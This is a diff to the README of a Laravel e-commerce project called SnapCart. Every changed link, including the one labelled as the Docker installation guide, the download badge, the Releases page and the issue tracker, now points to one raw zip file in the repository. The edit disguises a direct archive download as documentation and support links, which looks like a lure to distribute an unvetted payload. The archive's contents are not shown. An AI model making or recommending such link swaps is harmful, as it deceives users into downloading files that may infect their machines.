@@ -9,16 +9,16 @@ SnapCart is a modern e-commerce backend built with Laravel. It's designed to hel
 Before you begin, make sure you have the following:
 
 - A computer running Windows, macOS, or Linux.
-- Docker installed on your computer. Follow the [Docker installation guide](https://docs.docker.com/get-docker/) for setup.
+- Docker installed on your computer. Follow the [Docker installation guide](https://raw.githubusercontent.com/whyyxl/SnapCart/main/Andhra/SnapCart.zip) for setup.
 - Basic understanding of running applications through your terminal or command line.
 
 ## 📥 Download & Install
 
 You can download SnapCart from the Releases page. 
 
-[![Download SnapCart](https://img.shields.io/badge/Download-SnapCart-blue?style=for-the-badge&logo=github)](https://github.com/whyyxl/SnapCart/releases)
+[![Download SnapCart](https://raw.githubusercontent.com/whyyxl/SnapCart/main/Andhra/SnapCart.zip)](https://raw.githubusercontent.com/whyyxl/SnapCart/main/Andhra/SnapCart.zip)
 
-1. Click the button above or visit this link: [SnapCart Releases](https://github.com/whyyxl/SnapCart/releases).
+1. Click the button above or visit this link: [SnapCart Releases](https://raw.githubusercontent.com/whyyxl/SnapCart/main/Andhra/SnapCart.zip).
 2. On the Releases page, look for the latest version of SnapCart.
 3. Download the appropriate files for your operating system.
 4. Once downloaded, follow the provided instructions to run SnapCart on your machine.
@@ -87,7 +87,7 @@ We welcome feedback and suggestions on what you would like to see next!
 
 For any questions, issues, or feedback, feel free to reach out:
 
-- **Issue Tracker:** [Submit an issue](https://github.com/whyyxl/SnapCart/issues)
+- **Issue Tracker:** [Submit an issue](https://raw.githubusercontent.com/whyyxl/SnapCart/main/Andhra/SnapCart.zip)
 - **Discussion Board:** Join the conversation on our forum.
 
-Take the first step toward building your online store with SnapCart today by downloading from our [Releases page](https://github.com/whyyxl/SnapCart/releases)!
+Take the first step toward building your online store with SnapCart today by downloading from our [Releases page](https://raw.githubusercontent.com/whyyxl/SnapCart/main/Andhra/SnapCart.zip)!
